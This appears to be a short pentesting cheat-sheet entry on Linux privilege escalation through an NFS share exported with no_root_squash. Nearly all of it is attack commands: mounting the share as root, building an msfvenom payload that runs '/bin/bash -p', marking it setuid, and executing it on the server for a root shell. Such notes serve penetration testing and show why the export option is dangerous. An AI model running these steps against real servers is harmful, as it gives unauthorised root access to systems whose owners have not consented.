If we have a mounted folder with **no_root_squash** option we can do the following steps to get privilege escalation:

1. Become root user in the client machine
2. Create a directory in the shared folder(`/etc/exports`) and mount it as root user:
```bash
mkdir /tmp/nfs

mount -o rw,vers=3 {SERVER-IP}:/tmp /tmp/nfs
```
3. Create a simple payload in the client-side to run the `/bin/bash` command:
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

chmod +xs /tmp/nfs/shell.elf
```
4. In the server-side run
```bash
/tmp/nfs/shell.elf
```
